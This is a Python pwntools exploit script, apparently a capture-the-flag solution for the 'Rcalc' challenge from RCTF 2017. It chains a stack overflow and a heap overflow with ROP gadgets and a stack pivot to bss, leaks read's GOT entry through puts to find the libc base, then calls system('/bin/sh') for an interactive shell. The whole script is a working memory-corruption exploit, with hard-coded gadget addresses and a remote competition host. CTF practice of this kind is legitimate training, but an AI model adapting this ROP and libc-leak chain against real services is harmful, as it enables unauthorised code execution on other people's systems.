#!/usr/bin python
from pwn import *

debug = 1
gdb_debug = 1

if debug:
	p = process('./Rcalc')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	#context.log_level = "debug"
else:
	p = remote('rcalc.2017.teamrois.cn', 2333)
	libc = ELF('libc.so.6')

elf = ELF('Rcalc')

def add(int1, int2):
	p.recvuntil("Your choice:")
	p.sendline('1')
	p.recvuntil("input 2 integer: ")
	p.sendline(str(int1))
	p.sendline(str(int2))
	p.recvuntil("Save the result? ")
	p.sendline("yes")

mov3_call = 0x401100 
pop6_ret = 0x40111A
pop_rdi_ret = 0x401123
#however, 0x400cbd not working
#0x0000000000400cbd : leave; ret
leave_ret = 0x401034

bss = 0x602300
read_got = elf.got['read']
'''
we must attention that when scanf will stop read data from streams
when space character, tab character, line feeds and some othter characters
read_got includes '\x20', so we must do a little deal with it
'''
#read(0, bss, 0x100) and stack pivot
payload = 'a' * 0x108
payload += p64(2)
payload += 'b' * 8
payload += p64(pop6_ret)
payload += p64(0x60)
payload += p64(0x60 + 1)
payload += p64(0x601D50)
payload += p64(0x100)
payload += p64(bss)
payload += p64(0)
payload += p64(mov3_call)
payload += 'a' * 8
payload += p64(0)
payload += p64(bss -8)  #rbp
payload += 'a' * 32
payload += p64(leave_ret)


p.recvuntil("Input your name pls: ")
p.sendline(payload)

#heap overflow 
for i in range(0x22):
	add(1, 1)
add(1, 1)

p.recvuntil("Your choice:")
p.sendline('5')
#gdb.attach(p)

puts_plt = elf.symbols['puts']
payload2 = p64(pop_rdi_ret)
payload2 += p64(read_got)
payload2 += p64(puts_plt)
#read(0, bss + 0x100, 0x100) and stack pivot
#avoid to overlap previous stack data
payload2 += p64(pop6_ret)
payload2 += p64(0)
payload2 += p64(1)
payload2 += p64(read_got)
payload2 += p64(0x100)
payload2 += p64(bss + 0x100)
payload2 += p64(0)
payload2 += p64(mov3_call)
payload2 += 'a' * 8
payload2 += p64(0)
payload2 += p64(bss -8 + 0x100)  #rbp
payload2 += 'a' * 32
payload2 += p64(leave_ret) #mov rsp, rbp; pop rbp

p.sendline(payload2)
read_addr = u64(p.recv(6).ljust(8, '\x00'))
print "read_addr: " + hex(read_addr)
libc_addr = read_addr - libc.symbols['read']
print "libc_addr: " + hex(libc_addr)
system_addr = libc_addr + libc.symbols['system']
print "system_addr: " + hex(system_addr)
binsh_addr = libc_addr + next(libc.search('/bin/sh'))
print "binsh_addr: " + hex(binsh_addr)

payload3 = p64(pop_rdi_ret)
payload3 += p64(binsh_addr)
payload3 += p64(system_addr)

p.sendline(payload3)

p.interactive()
